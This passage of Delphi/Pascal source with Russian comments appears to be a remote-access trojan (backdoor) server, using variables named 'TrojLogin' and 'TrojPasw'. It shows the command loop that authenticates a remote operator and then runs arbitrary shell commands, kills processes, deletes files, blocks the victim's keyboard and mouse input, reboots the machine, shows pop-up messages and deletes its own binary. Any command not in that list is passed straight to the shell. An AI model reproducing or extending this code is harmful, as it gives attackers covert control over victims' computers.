               // Я тупой! Опять длину перепутал! Теперь всё работает.
               Cmd:=Copy(Cmd, 5, Length(Cmd) - 4);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     Rm(Cmd);
                     ShErr;
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\rmr') Then
            Begin
               Cmd:=Copy(Cmd, 6, Length(Cmd) - 5);
               If (CheckCmd(Cmd, 2)) Then
                  Begin
                     Rmr(Cmd);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\ds') Then
            Begin
               // Объём диска
               // Номер диска: 0 - текущий, 1 - A, 2 - B, 3 - C и т.д.
               If (Length(Cmd) < 5) Then DiskStat(#0)
               Else DiskStat(Copy(Cmd, 5, 1)[1]);
            End
         Else
         If (Cmd = '\ps') Then
            Begin
               Ps;
            End
         Else
         If (Trim(Copy(Cmd, 1, 6)) = '\kill') Then
            Begin
               If Not Kill(StrToIntDef(Copy(Cmd, 7, Length(Cmd) - 6), -1)) Then
                  WriteLf(ErrArray[8]);
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\cmd') Then
            Begin
               Cmd:=Comspec + ' ' + Copy(Cmd, 6, Length(Cmd) - 4);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     ExecConsoleApp(Cmd);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\run') Then
            Begin
               Cmd:=Copy(Cmd, 6, Length(Cmd) - 4);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     SExec(Cmd, 'open');
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\print') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 6);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     SExec(Cmd, 'print');
                  End;
            End
         Else
         If (Cmd = '\bi') Then
            Begin
               BlockInput(True);
            End
         Else
         If (Cmd = '\ubi') Then
            Begin
               BlockInput(False);
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\msg') Then
            Begin
               MsgAlert(Copy(Cmd, 6, Length(Cmd)));
            End
         Else
         If (Cmd ='\reboot') Then
            Begin
               ClnStop(Srv, Cln);
               If (Not WinReboot) Then WriteLf(ErrArray[6]);
            End
         Else
         If (Cmd = '\s') Then
            Begin
               Write('WARNING! Server will be halted! Continue(y,N)' + PS2);
               Cmd:=ReadCmd;
               If ((Cmd = 'y') Or (Cmd = 'Y')) Then
                  Begin
                     WriteLf(LN_FEED + Disc_String);
                     ClnStop(Srv,Cln);
                     CloseSocket(Srv);
                     Sleep(RestartTimeWait);
                     Halt;
                  End;
            End
         Else
         If (Cmd = '\r') Then
            Begin
               Write('WARNING! Server will be restarted! Continue(y,N)' + PS2);
               Cmd:=ReadCmd;
               If ((Cmd = 'y') Or (Cmd = 'Y')) Then
                  Begin
                     WriteLf(LN_FEED + Disc_String);
                     ClnStop(Srv,Cln);
                     CloseSocket(Srv);
                     Sleep(RestartTimeWait);
                     StartServer(StrToIntDef(l_port, 0));
                  End;
            End
         Else
         If (Cmd = '\delserver') Then
            Begin
               Write('WARNING! SERVER BINARY WILL BE REMOVED!!! CONTINUE(y,N)' + PS2);
               Cmd := ReadCmd;
               If ((Cmd = 'y') Or (Cmd = 'Y')) Then
                  Begin
                     WriteLf('Умираююю. Прощай! Ааа..');
                     WriteLf(LN_FEED + Disc_String);
                     ClnStop(Srv,Cln);
                     CloseSocket(Srv);
                     Sleep(RestartTimeWait);

                     DeleteSelf;
                     //ExitProcessProc:=@DeleteSelf;
//                     Halt;
                  End;
            End
         Else
         If (Cmd = '\h') Or (Cmd = '\?') Or (Cmd = '\help') Then
            Begin
               Usage;
            End
         Else WriteLf(ErrArray[7]);

      End;
   Procedure Do_ext_cmd;
      Begin
         ExecConsoleApp(Cmd);
      End;

Begin
   If Length(Cmd) < 1 Then Exit;
   If (Cmd[1] = '\') Then Do_int_cmd //Команда внутренняя
   Else Do_ext_cmd; //Команда внешняя
End;

Function Main(dwEntryPoint: Pointer): dword; stdcall;
Begin
   Srv := StartServer(StrToIntDef(l_port, 0));
   If (Srv <= 0) Then Halt(1);
   Repeat
      Sleep(10);
      Cln := WaitClient(Srv);
      AssignCrtSock(Cln, Tf, Output);
      Send(Cln, PChar(Str_Hello), Length(Str_Hello), 0);
      Send(Cln, PChar(Str_Login), Length(Str_Login), 0);
      CurLogin := ReadLogin;
//      TrmCmd:=ReadLogin;
      Send(Cln, PChar(Str_Psw), Length(Str_Psw), 0);
      If (ReadPasw <> GetRealPasw(TrojPasw)) Then
      // Несоответствует пароль
         Begin
            If Check_Avail Then
               Begin
                  WriteLf(ErrArray[5]);
                  ClnStop(Srv, Cln);
               End;
            Continue;
         End;
      if (CurLogin <> TrojLogin) Then
      // Несоответствует логин
         Begin
            If Check_Avail Then
               Begin
                  WriteLf(ErrArray[5]);
                  ClnStop(Srv,Cln);
               End;
            Continue;
         End;
      Write(LN_FEED);
      While Check_Avail
         Do
            Begin
               Write(PS1);
               TrmCmd := ReadCmd;
               Do_cmd(TrmCmd);
               Sleep(100);
            End;

   Until false;
   Disconnect(Cln);
   ExitThread(0);
End;

Begin
   Main(nil);
End.
